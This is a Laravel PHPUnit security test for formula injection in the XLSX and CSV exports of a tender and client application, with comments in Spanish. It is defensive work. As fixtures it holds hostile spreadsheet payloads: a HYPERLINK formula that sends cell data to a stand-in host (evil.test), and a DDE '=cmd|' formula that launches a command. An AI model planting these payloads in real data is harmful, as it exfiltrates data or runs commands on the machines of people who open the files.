<?php

namespace Tests\Security;

use App\Models\Client;
use App\Models\Tender;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PHPUnit\Framework\Attributes\Group;
use Tests\TestCase;

/**
 * Hallazgo: inyección de fórmulas en los exportes XLSX/CSV.
 *
 * `Worksheet::fromArray()` convierte en FÓRMULA todo texto que empieza con «=». Un título de
 * licitación (que también puede venir del OCR de HonduCompras o de un cliente MCP) como
 * `=HYPERLINK("https://atacante/?d="&A3;"Ver")` se ejecuta al abrir el Excel. En CSV,
 * `fputcsv()` deja pasar `=`, `+`, `-` y `@` al inicio de la celda.
 *
 * Estas pruebas FALLAN mientras la vulnerabilidad exista.
 */
#[Group('security')]
class SpreadsheetInjectionTest extends TestCase
{
    use RefreshDatabase;

    private const PAYLOAD = '=HYPERLINK("https://evil.test/?d="&C2,"Ver detalle")';

    public function test_el_exporte_xlsx_de_licitaciones_no_ejecuta_formulas_de_los_datos(): void
    {
        [$admin, $company] = $this->memberOf();
        Tender::factory()->for($company)->create(['title' => self::PAYLOAD]);

        $response = $this->actingAs($admin)->get('/licitaciones/export/xlsx');
        $response->assertOk();

        $sheet = IOFactory::load($response->baseResponse->getFile()->getPathname())->getActiveSheet();

        $this->assertNotSame(DataType::TYPE_FORMULA, $sheet->getCell('B2')->getDataType(), 'El título se guardó como fórmula ejecutable en el XLSX.');
    }

    public function test_el_exporte_csv_de_clientes_neutraliza_formulas(): void
    {
        [$admin, $company] = $this->memberOf();
        Client::factory()->for($company)->create(['name' => '=cmd|\' /C calc\'!A0', 'contact_name' => '@SUM(1+1)']);

        $csv = $this->actingAs($admin)->get('/clientes/export/csv')->assertOk()->streamedContent();
        $rows = array_map('str_getcsv', array_filter(preg_split('/\r?\n/', ltrim($csv, "\xEF\xBB\xBF"))));

        foreach (array_slice($rows, 1) as $row) {
            foreach ($row as $cell) {
                $this->assertDoesNotMatchRegularExpression('/^[=+\-@\t\r]/', $cell, "Celda CSV con fórmula sin neutralizar: {$cell}");
            }
        }
    }
}
